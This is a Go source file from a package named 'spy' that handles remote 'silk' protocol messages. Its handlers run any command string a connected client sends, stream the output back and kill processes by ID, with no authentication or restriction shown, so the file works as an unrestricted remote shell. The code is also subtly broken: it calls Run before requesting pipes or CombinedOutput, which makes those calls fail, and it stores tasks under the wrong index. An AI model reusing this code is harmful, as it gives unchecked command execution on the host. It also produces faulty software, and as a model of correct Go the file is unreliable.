package spy

import (
	"encoding/binary"
	"github.com/go-well/spider/silk"
	"io"
	"os"
	"os/exec"
	"strings"
	"sync"
)

type task struct {
	stdin  io.WriteCloser
	stdout io.ReadCloser
}

var tasks sync.Map
var tasksIndex uint16 = 1

func init() {

	RegisterHandler(silk.TaskCreate, func(c *Client, p *silk.Package) {
		p.Type = silk.TaskCreateAck

		names := strings.Split(string(p.Data), " ")
		cmd := exec.Command(names[0], names[1:]...)
		err := cmd.Run()
		if err != nil {
			p.SetError(err.Error())
			_ = c.Send(p)
			return
		}

		stdout, err := cmd.StdoutPipe()
		if err != nil {
			p.SetError(err.Error())
			_ = c.Send(p)
			return
		}
		stdin, err := cmd.StdinPipe()
		if err != nil {
			p.SetError(err.Error())
			_ = c.Send(p)
			return
		}

		//缓存
		tasks.Store(fileIndex, &task{
			stdin:  stdin,
			stdout: stdout,
		})
		buf := make([]byte, 512)
		binary.BigEndian.PutUint16(buf, tasksIndex)
		tasksIndex++

		p.Data = buf[:2]
		_ = c.Send(p)

		go func() {
			for {
				n, e := stdout.Read(buf[2:])
				if e != nil {
					break
				}
				_ = c.Send(&silk.Package{
					Type: silk.TaskData,
					Data: buf[:2+n],
				})
			}
			_ = c.Send(&silk.Package{
				Type: silk.TaskEnd,
				Data: buf[:2],
			})
		}()

	})

	RegisterHandler(silk.TaskExecute, func(c *Client, p *silk.Package) {
		p.Type = silk.TaskExecuteAck
		names := strings.Split(string(p.Data), " ")
		cmd := exec.Command(names[0], names[1:]...)
		err := cmd.Run()
		if err != nil {
			p.SetError(err.Error())
			_ = c.Send(p)
			return
		}
		p.Data, err = cmd.CombinedOutput()
		if err != nil {
			p.SetError(err.Error())
		}
		_ = c.Send(p)
	})

	RegisterHandler(silk.TaskRun, func(c *Client, p *silk.Package) {
		p.Type = silk.TaskRunAck
		names := strings.Split(string(p.Data), " ")
		cmd := exec.Command(names[0], names[1:]...)
		err := cmd.Start()
		if err != nil {
			p.SetError(err.Error())
		}
		_ = c.Send(p)
	})

	RegisterHandler(silk.TaskKill, func(c *Client, p *silk.Package) {
		p.Type = silk.TaskKillAck
		id := binary.BigEndian.Uint64(p.Data)
		pro, err := os.FindProcess(int(id))
		if err != nil {
			p.SetError(err.Error())
			_ = c.Send(p)
			return
		}
		err = pro.Kill()
		if err != nil {
			p.SetError(err.Error())
		}
		_ = c.Send(p)
	})
}
